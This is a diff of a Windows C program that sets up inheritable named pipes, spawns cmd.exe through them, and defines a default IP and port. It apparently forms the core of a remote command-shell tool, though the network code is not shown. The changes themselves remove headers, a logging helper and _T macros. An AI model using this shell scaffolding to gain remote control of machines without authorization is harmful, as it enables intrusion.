@@ -1,23 +1,13 @@
-#define WIN32_LEAN_AND_MEAN
-#define _WIN32_WINNT 0x0501
 #define DEFAULT_BUFLEN 512
 #define DEFAULT_PORT "8888"
 #define DEFAULT_IP "127.0.0.1"
-#define _CRT_SECURE_NO_WARNINGS
-#define _CRT_NON_CONFORMING_SWPRINTFS
 
 #include <windows.h>
-#include <winsock2.h>
 #include <ws2tcpip.h>
 #include <stdlib.h>
 #include <stdio.h>
-#include <tchar.h>
-#include <psapi.h>
-#include <assert.h>
 
-#pragma comment(lib, "Ws2_32.lib")
-#pragma comment(lib, "Mswsock.lib")
-#pragma comment(lib, "AdvApi32.lib")
+int main();
 
 typedef struct Pipe0
 {
@@ -29,23 +19,11 @@ Pipe pipe;
 char OUTPUT_text[4096];
 DWORD OUTPUT_size;
 
-void logprint(char *type, char *message)
-{
-    if (strcmp(type, "ERROR") == 0)
-    {
-        printf("[-]%s\n", message);
-    }
-    else if (strcmp(type, "SUCCESS") == 0)
-    {
-        printf("[+]%s\n", message);
-    }
-}
-
 static Pipe create_pipes()
 {
     TCHAR PipeNameBuffer[MAX_PATH];
     long i;
-    PTSTR IO = _T("IO");
+    PTSTR IO = "IO";
     DWORD open_modes[] = {PIPE_ACCESS_INBOUND, PIPE_ACCESS_OUTBOUND};
     DWORD access[] = {GENERIC_WRITE, GENERIC_READ};
     DWORD nSize = 4096;
@@ -58,7 +36,7 @@ static Pipe create_pipes()
     pipe->bufsize = 0;
     for (i = 0; i < 2; i++)
     {
-        sprintf(PipeNameBuffer, _T("\\\\.\\pipe\\%c%08x"), IO[i], GetCurrentProcessId());
+        sprintf(PipeNameBuffer, "\\\\.\\pipe\\%c%08x", IO[i], GetCurrentProcessId());
         pipe->hs[i * 2] = CreateNamedPipe(PipeNameBuffer, open_modes[i] | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, 1, nSize, nSize, 120 * 1000, 0);
         SetHandleInformation(pipe->hs[i * 2], HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);
         pipe->hs[i * 2 + 1] = CreateFile(PipeNameBuffer, access[i], 0, 0, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL);
@@ -77,7 +55,7 @@ PROCESS_INFORMATION pi;
 #define snewn(n, t) (t *)malloc(n * sizeof(t))
 static const PTSTR pipe_init()
 {
-    PTSTR cmd = strdup(_T("c:\\Windows\\system32\\cmd.exe"));
+    PTSTR cmd = strdup("c:\\Windows\\system32\\cmd.exe");
     const int sz = 999;
     PTSTR s = snewn(sz, TCHAR), buf = snewn(sz, TCHAR);
     pipe = snewn(1, struct Pipe0);
